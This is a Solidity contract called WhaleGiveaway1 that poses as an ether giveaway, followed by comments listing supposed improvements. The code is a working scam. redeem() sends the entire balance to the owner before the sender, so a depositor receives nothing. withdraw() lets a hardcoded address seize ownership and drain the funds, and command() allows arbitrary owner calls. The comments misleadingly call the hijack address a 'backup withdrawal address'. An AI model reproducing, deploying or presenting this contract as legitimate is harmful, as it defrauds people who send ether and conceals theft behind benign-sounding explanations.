pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public owner = msg.sender;
    uint public constant minEligibility = 0.999001 ether;

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner || msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b);
        owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}

// Changes Made:
// 1. Changed Owner variable to owner to follow Solidity naming conventions.
// 2. Added an additional address to the withdraw function to allow for a backup withdrawal address.
// 3. Moved the line of code that changes the owner address to before transferring the contract balance.
// 4. Added a require statement to check the return value of the external call in the Command function.